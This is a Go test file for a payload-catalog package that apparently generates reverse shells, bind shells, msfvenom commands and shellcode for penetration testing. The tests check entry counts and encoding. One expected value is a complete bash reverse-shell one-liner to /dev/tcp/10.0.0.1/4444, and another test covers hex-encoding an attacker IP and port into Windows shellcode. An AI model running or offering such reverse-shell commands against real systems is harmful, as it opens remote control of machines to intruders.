package catalog

import (
	"strings"
	"testing"
)

func TestAllCounts(t *testing.T) {
	counts := map[Category]int{}
	for _, e := range All() {
		if e.Category == "" {
			t.Fatalf("entry %q has no category, tags=%v", e.Name, e.Tags)
		}
		counts[e.Category]++
	}
	want := map[Category]int{
		ReverseShell: 74,
		BindShell:    9,
		MSFVenom:     22,
		HoaxShell:    10,
		Shellcode:    20,
	}
	for cat, n := range want {
		if counts[cat] != n {
			t.Errorf("%s: got %d entries, want %d", cat, counts[cat], n)
		}
	}
	if len(Listeners()) == 0 {
		t.Error("Listeners() is empty")
	}
	if len(Shells()) == 0 {
		t.Error("Shells() is empty")
	}
}

func findEntry(t *testing.T, name string) Entry {
	for _, e := range All() {
		if e.Name == name {
			return e
		}
	}
	t.Fatalf("entry %q not found", name)
	return Entry{}
}

func TestRenderPlain(t *testing.T) {
	e := findEntry(t, "Bash -i")
	got := Render(e, Vars{IP: "10.0.0.1", Port: 4444, Shell: "/bin/bash"}, NoEncoding)
	want := "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
	if got != want {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestRenderURLEncoding(t *testing.T) {
	e := findEntry(t, "nc -e")
	vars := Vars{IP: "10.0.0.1", Port: 4444, Shell: "/bin/sh"}
	got := Render(e, vars, URLEncoding)
	want := percentEncode(Render(e, vars, NoEncoding))
	if got != want {
		t.Errorf("got %q, want %q", got, want)
	}
	if gotDouble := Render(e, vars, URLEncodingDouble); gotDouble != percentEncode(want) {
		t.Errorf("double encoding: got %q, want %q", gotDouble, percentEncode(want))
	}
}

func TestRenderShellcodeHexEncodesIPAndPort(t *testing.T) {
	e := findEntry(t, "Windows - Reverse TCP (x86)")
	got := Render(e, Vars{IP: "192.168.1.10", Port: 4444}, NoEncoding)
	if got == e.Command {
		t.Fatal("placeholders were not substituted")
	}
	for _, placeholder := range []string{"{ip}", "{port}"} {
		if strings.Contains(got, placeholder) {
			t.Errorf("rendered shellcode still contains %q", placeholder)
		}
	}
	// 192.168.1.10 -> c0 a8 01 0a, port 4444 -> 0x115c
	if !strings.Contains(got, `\xc0\xa8\x01\x0a`) {
		t.Errorf("expected hex-encoded IP in %q", got)
	}
	if !strings.Contains(got, `\x11\x5c`) {
		t.Errorf("expected hex-encoded port in %q", got)
	}
}
